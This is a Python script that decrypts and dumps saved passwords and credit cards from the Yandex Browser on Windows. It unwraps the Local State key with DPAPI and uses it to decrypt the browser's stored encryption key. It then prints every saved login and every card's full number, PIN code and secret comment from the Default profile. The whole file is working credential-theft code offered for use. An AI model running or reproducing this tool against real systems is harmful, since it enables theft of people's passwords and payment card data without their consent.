

# Import modules
from sys import exit
from json import load, loads
from os import path, environ
from base64 import b64decode
from DPAPI import CryptUnprotectData
from sqlite3 import connect, Cursor
from Crypto.Hash import SHA1
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# Path's
userData = path.join(environ.get('LOCALAPPDATA'), 'Yandex', 'YandexBrowser', 'User Data')
localState = path.join(userData, 'Local State')

# Check installation
if not path.exists(localState):
    exit('[!] No Yandex browser installed')

# Read & Decrypt local state key
with open(localState, 'rb') as json:
    encrypted_key = b64decode(load(json)['os_crypt']['encrypted_key'])[5:]
    decrypted_key = CryptUnprotectData(encrypted_key)
    print('[+] Local state key decrypted:', decrypted_key)
    

def extract_enc_key(db_cursor : Cursor) -> bytes:
    db_cursor.execute('SELECT value FROM meta WHERE key = \'local_encryptor_data\'')
    local_encryptor = db_cursor.fetchone()
    # Check local encryptor values
    if local_encryptor == None:
        print('[!] Failed to read local encryptor')
        return None
    # Locate encrypted key bytes
    local_encryptor_data = local_encryptor[0]
    index_enc_data = local_encryptor_data.find(b'v10')
    if index_enc_data == -1:
        print('[!] Encrypted key blob not found')
        return None
    # Extract cipher data
    encrypted_key_blob = local_encryptor_data[index_enc_data + 3 : index_enc_data + 3 + 96]
    nonce = encrypted_key_blob[:12]
    ciphertext = encrypted_key_blob[12:-16]
    tag = encrypted_key_blob[-16:]
    # Initialize the AES cipher
    aes_decryptor = AES.new(decrypted_key, AES.MODE_GCM, nonce=nonce)
    # Decrypt the key
    decrypted_data = aes_decryptor.decrypt_and_verify(ciphertext, tag)
    # Check signature
    if int.from_bytes(decrypted_data[:4], 'little') != 0x20120108:
        print('[!] Signature of decrypted local_encryptor_data incorrect')
        return None
    # Got the key :P
    return decrypted_data[4:36]


def decrypt(key : bytes, encrypted_data : bytes, nonce : bytes, tag : bytes, aad : bytes) -> str:
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    if aad:
        cipher.update(aad)
    decrypted_data = cipher.decrypt_and_verify(encrypted_data, tag)
    return decrypted_data.decode('utf-8')


def dump_passwords(profile : str) -> list[dict]:
    db_path = path.join(userData, profile, 'Ya Passman Data')
    with connect(db_path) as conn:
        cursor = conn.cursor()
        # Dump encryption key
        enc_key = extract_enc_key(cursor)
        if not enc_key:
            print('[!] Failed to extract enc key')
            return None
        # Execute queries
        cursor.execute('SELECT origin_url, username_element, username_value, password_element, password_value, signon_realm FROM logins')
        for url, username_element, username, password_element, password, signon_realm in cursor.fetchall():
            # Серёга костыль
            if type(url) == bytes:
                url = url.decode()
            # Get AAD
            str_to_hash = f'{url}\0{username_element}\0{username}\0{password_element}\0{signon_realm}'
            hash_obj = SHA1.new()
            hash_obj.update(str_to_hash.encode('utf-8'))
            # Decrypt password value
            if len(password) > 0:
                try:
                    decrypted = decrypt(
                        key=enc_key,
                        encrypted_data=password[12:-16],
                        nonce=password[:12],
                        tag=password[-16:],
                        aad=hash_obj.digest()
                    )
                except Exception as e: 
                    print(e)
                else:
                    yield dict(hostname=url, username=username, password=decrypted)


def dump_cards(profile : str) -> list[dict]:
    db_path = path.join(userData, profile, 'Ya Credit Cards')
    with connect(db_path) as conn:
        cursor = conn.cursor()
        # Dump encryption key
        enc_key = extract_enc_key(cursor)
        if not enc_key:
            print('[!] Failed to extract enc key')
            return None
        # Execute queries
        cursor.execute('SELECT guid, public_data, private_data FROM records')
        for guid, public_data, private_data in cursor.fetchall():
            # Decrypt private value
            decrypted_private = decrypt(
                key=enc_key,
                encrypted_data=private_data[12:-16],
                nonce=private_data[:12],
                tag=private_data[-16:],
                aad=guid.encode('utf-8'),
            )
            private = loads(decrypted_private)
            public = loads(public_data.decode('utf-8'))
            # Done
            yield dict(
                number=private['full_card_number'],
                pin_code=private['pin_code'],
                secret_comment=private['secret_comment'],
                expire_month=public['expire_date_month'],
                expire_date_year=public['expire_date_year'],
                card_holder=public['card_holder'],
                card_title=public['card_title'],
            )


if __name__ == '__main__':  

    for p in dump_passwords('Default'):
        print(p)

    for v in dump_cards('Default'):
        print(v)
